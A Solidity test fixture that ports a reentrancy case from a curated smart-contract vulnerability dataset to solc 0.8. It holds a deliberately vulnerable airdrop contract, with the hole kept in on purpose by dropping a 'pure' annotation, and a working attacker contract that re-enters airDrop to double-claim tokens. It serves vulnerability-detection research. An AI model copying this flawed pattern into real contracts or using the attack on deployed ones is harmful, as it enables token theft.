// SPDX-License-Identifier: MIT
/*
 * PROVENANCE
 * =========================================================================
 * Dataset:          smartbugs/smartbugs-curated
 * Dataset path:     dataset/reentrancy/modifier_reentrancy.sol
 * Upstream source:  https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/reentracy/modifier_reentrancy.sol
 * Original author:  -
 * Original pragma:  pragma solidity ^0.4.24;
 * Original vulnerable line: 15
 * Dataset report marker: // <yes> <report> REENTRANCY
 * =========================================================================
 *
 * This is the VULNERABLE port. The dataset contract is named ModifierEntrancy;
 * it is renamed to ModifierReentrancy (the dataset's helper `Bank` becomes
 * ModifierReentrancyBank and its example `attack` becomes ModifierReentrancyAttack).
 *
 * Porting edits (0.4.24 -> 0.8.24 migration ONLY):
 *   - uint -> uint256
 *   - `string constant name` kept (valid in 0.8)
 *
 * ONE MIGRATION EDIT REQUIRES EXPLANATION -- ModifierReentrancyBank.supportsToken():
 * the dataset declares it `external pure`. On solc 0.8.x a call to a view/pure
 * function compiles to STATICCALL, and a STATICCALL forbids ANY state change in
 * the callee and its whole sub-call tree. The modifier below makes exactly such a
 * call (`ModifierReentrancyBank(msg.sender).supportsToken()`), so keeping `pure`
 * would make the modifier's external call static and the re-entrancy -- which
 * needs the attacker to mutate state -- impossible: the compiler would silently
 * NEUTRALISE the vulnerability.
 * In solc 0.4.24 this was not the case: STATICCALL code generation for view/pure
 * calls only landed in 0.5.0, so the original call was a plain CALL. Dropping the
 * `pure` annotation therefore RESTORES the original call semantics and is part of
 * the 0.4 -> 0.8 migration. (Verified empirically: with `pure` the attack reverts;
 * without it the attack reproduces.)
 *
 * THE VULNERABLE ORDERING IS PRESERVED VERBATIM: the modifiers are still applied
 * `hasNoBalance supportsToken` (hasNoBalance outermost), so the external call in
 * supportsToken() runs BEFORE the `tokenBalance[msg.sender] += 20` state change,
 * while hasNoBalance's zero-balance check has already passed. A re-entrant
 * airDrop() therefore passes hasNoBalance again and the drop is counted twice.
 */
pragma solidity ^0.8.24;

contract ModifierReentrancy {
    mapping(address => uint256) public tokenBalance;
    string constant name = "Nu Token";

    // If a contract has a zero balance and supports the token give them some token
    // <yes> <report> REENTRANCY
    function airDrop() public hasNoBalance supportsToken {
        tokenBalance[msg.sender] += 20;
    }

    // Checks that the contract responds the way we want
    modifier supportsToken() {
        require(keccak256(abi.encodePacked("Nu Token")) == ModifierReentrancyBank(msg.sender).supportsToken());
        _;
    }

    // Checks that the caller has a zero balance
    modifier hasNoBalance {
        require(tokenBalance[msg.sender] == 0);
        _;
    }
}

// Dataset helper `Bank`, renamed. NOTE: deliberately NOT marked pure/view -- see
// the header note above (0.4.24 emitted a plain CALL; 0.8 would emit STATICCALL).
contract ModifierReentrancyBank {
    function supportsToken() external returns (bytes32) {
        return (keccak256(abi.encodePacked("Nu Token")));
    }
}

// The dataset's example attacker, renamed with the fixture prefix.
contract ModifierReentrancyAttack {
    bool hasBeenCalled;

    function supportsToken() external returns (bytes32) {
        if (!hasBeenCalled) {
            hasBeenCalled = true;
            ModifierReentrancy(msg.sender).airDrop();
        }
        return (keccak256(abi.encodePacked("Nu Token")));
    }

    function call(address token) public {
        ModifierReentrancy(token).airDrop();
    }
}
